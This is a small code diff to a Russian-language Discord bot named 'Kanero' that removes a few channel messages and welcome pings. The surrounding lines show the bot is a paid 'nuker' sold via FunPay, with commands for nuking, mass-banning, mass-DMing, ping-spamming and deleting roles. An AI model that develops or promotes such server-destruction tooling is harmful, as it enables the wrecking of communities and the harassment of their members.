@@ -2973,7 +2973,7 @@ async def setup(ctx):
     a.add_field(name="✅ White", value="`!nuke [канал]` • `!stop` • `!cleanup`\n`!rename` • `!nicks_all` • `!webhooks`\nКупить: [FunPay](https://funpay.com/users/16928925/)", inline=False)
     a.add_field(name="💎 Premium", value="`!super_nuke` • `!massban` • `!massdm`\n`!spam` • `!pingspam` • `!rolesdelete`\n`!auto_super_nuke` • `!auto_superpr_nuke`\nКупить: [FunPay](https://funpay.com/users/16928925/)", inline=False)
     a.set_footer(text="☠️ Kanero  |  Лучший нюкер для-бота")
-    await addbot_ch.send(embed=a)
+    # Не отправляем в #addbot - только удаляем сообщения там
 
     # Кнопка с созданием тикета в create-ticket
     ticket_embed = discord.Embed(
@@ -3749,7 +3749,7 @@ async def fl_add(ctx, *, user_input: str):
                     color=0x00ff00
                 )
                 notif.set_footer(text="🤖 Kanero  |  discord.gg/aud6wwYVRd")
-                await addbot_ch.send(content=user.mention, embed=notif)
+                # Не отправляем уведомление в #addbot
     except Exception:
         pass
     await ctx.send(result_text)
@@ -4928,7 +4928,6 @@ async def on_member_join(member):
     embed.set_thumbnail(url=member.display_avatar.url)
     embed.set_footer(text=f"☠️ Kanero  |  Участник #{guild.member_count}")
     try:
-        await welcome_ch.send(f"👋 {member.mention}")
         await welcome_ch.send(embed=embed)
     except Exception:
         pass
